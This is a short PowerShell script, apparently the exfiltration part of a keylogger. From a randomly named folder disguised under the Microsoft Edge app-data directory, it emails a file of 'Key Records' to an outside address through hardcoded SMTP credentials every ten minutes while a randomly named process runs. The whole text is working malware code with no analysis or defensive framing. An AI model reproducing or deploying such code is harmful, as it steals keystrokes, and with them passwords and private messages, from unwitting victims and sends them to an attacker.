Set-Location $env:LOCALAPPDATA"\MicrosoftEdge\404eb8b50ea0d5d6\"
$SMTPServer = "smtp.mail.com"
$SMTPPort = "587"
$Username = "verynotsus@mail.com"
$Password = "verynotsuse"

Do
{

$to = "resultsiliketowatch@op.pl"
$subject = "Key_Records"
$body = "Key Records"
$attachment = "nmaqncdCwP.txt"

$message = New-Object System.Net.Mail.MailMessage
$message.subject = $subject
$message.body = $body
$message.to.add($to)
$message.from = $username
$message.attachments.add($attachment)
$smtp = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort);
$smtp.EnableSSL = $true
$smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
$smtp.send($message);

start-sleep 5

$message.Dispose() 

$proc = Get-Process

start-sleep 600

} While ($proc.name -contains 'ygoLa8SyqmQTGsoh') 